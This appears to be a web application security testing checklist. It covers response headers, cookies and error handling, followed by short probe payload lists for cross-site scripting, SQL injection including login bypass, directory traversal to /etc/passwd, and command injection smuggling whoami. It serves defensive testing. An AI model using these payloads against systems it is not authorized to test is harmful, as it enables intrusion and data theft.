The ratings provided in the checklist were primarily generating using CVSS V3.1 average scores for 2025 CVEs. Please use the following tools to create ratings that more accurately represent your application and organization's risk appetite:

https://owasp.org/www-community/OWASP_Risk_Rating_Methodology

https://www.first.org/cvss/calculator/4-0

## Continuous Review
Please continue to evaluate the continuous review section and response headers sections of the checklist throughout the entire assessment. We encourage app teams to update the checklist and payload lists with language specific links and relevant company policies to ensure future developers follow the organization's requirements.
### Error Messages are Properly Handled
Error messages should be short and generic. Do not show stack traces or informative messages to the user.
### Autocomplete Disabled on Sensitive Input Fields
Emails, password, challenge questions, and other sensitive information should have autocomplete="off".
### Sensitive Information is Masked
Sensitive information should be masked to mitigate shoulder surfing attacks.
### Sensitive Information Not in URL
Do not send sensitive information in GET request parameters.
### Unneccessary Methods are Disabled
Do not allow unsafe methods such as Trace or Connect on any endpoint. Disable DELETE, POST, etc. if not needed on the endpoint.
### HTTP Disabled
Enforce HTTPS for all connections.

## Response Headers
The following tools will check the response headers of your application and report on any insecurities or misconfigurations. We highly recommend checking the response headers manually because these tools may not follow the requirements of your organization. Additionally, most of these tools are limited to unauthenticated checks, meaning that sensitive authenticated responses will not be evaluated.

https://securityheaders.com/

https://hackertarget.com/http-header-check/

### Content-Security-Policy 
The CSP should include script-src and default-src. Do not use unsafe directives, such as unsafe-inline or unsafe-eval. Do not include wildcards in the CSP unless they are used in the subdomain of a trusted site. 

Quick Guide: https://content-security-policy.com/

Evaulation Tool: https://csp-evaluator.withgoogle.com/
### Strict-Transport-Security
The Strict-Transport-Security response header should contain the max-age directive set to 1 year or greater and the includeSubdomains directive. If the application is externally available, include the Preload directive.

Example: Strict-Transport-Security: max-age=63072000; includeSubDomains; preload

### Caching
**Cache-Control** - Set the cache-control response header to include the “no-store” flag in all responses.

**Expires** - Set the Expires header to a date in the past, or zero, in all responses.

### Information Leak Headers
Remove unneccessary response headers, such as: Server, X-Powered-By, X-AspNet-Version.

### CORS Headers
Do not set Access-Control-Allow-Origin to wildcard or reflect arbitrary origins/subdomains.

https://www.freecodecamp.org/news/exploiting-cors-guide-to-pentesting/

## Cookies
All cookies should have the following attributes: Secure, HttpOnly, SameSite: lax or strict.

https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie

## Payloads Required Section
This payload list will include a diverse set of basic payloads for each attack type with the goal of identifying the vulnerability using the least amount of attempts. For a longer list of payloads, see the LongPayloadList document or review the sources below. While this payload list was hand selected from my own personal notes(generated over the course of 3 years), most of the payloads can be found in the sources below.

[https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

https://book.hacktricks.wiki/en/index.html

https://portswigger.net/web-security/all-topics


## Cross-Site Scripting (XSS):

[https://portswigger.net/web-security/cross-site-scripting](https://portswigger.net/web-security/cross-site-scripting)

Enter the following payloads into user input fields and see how they are reflected in the application. If user input is reflected back unencoded and unfiltered, especially in javascript, then XSS is likely.

Alert() can be replaced with print() if your application is filtering out alert().
```
<b>test</b> 
<script>alert(1)</script>

<img src=1 onerror=alert(1)>

javascript:alert(document.cookie)

"onload="alert(1)

${alert(1)}

alert`1`

'-alert()-'
```


## SQL Injection
Review the following site for a cheat sheet showing specific requirements and payloads for the most common databases. This will help tailor the following payloads to your environment. For example, if your application uses MySQL, replace the `--` in the commands below with `#`.

https://portswigger.net/web-security/sql-injection/cheat-sheet

```
' followed by: ''

Oracle Concat: foo'||'bar
Microsoft Concat: foo'+'bar
PostgreSQL Concat: foo'||'bar
MySQL Concat: foo' 'bar

' OR 1=1 -- followed by: ' OR 1=2 --
' order by 1 -- followed by: ' order by 100 --
(SELECT 1) followed by: (SELECT 2)

'||pg_sleep(10)--
' OR sleep(5) OR '
'||pg_sleep(5)||'

SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

## SQL Injection on Login Pages
**Username Field:**
```
'
''
admin'--
admin')--
admin' or 1=1--
admin') or 1=1-- -
admin' AND 1=1-- 
admin'||1=1#
```

**Password Field:**
```
'
''
' or 1=1--
') or 1=1-- -
```

## Directory Traversal
Please use a file/file path that exists on the web server. For example, etc/passwd if its a linux server and windows/win.ini if it is a windows server. Extend the ../ as needed.
```
../../../etc
../../../etc/passwd
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
../../../windows/win.ini
```

## Command Injection
All "whoami" text can be replaced with "sleep 3."
```
+;+whoami
+&&+whoami
+|+whoami
+`whoami`
+$(whoami)
‘ | whoami
‘ | whoami ‘
‘ | whoami #
; sleep 3
```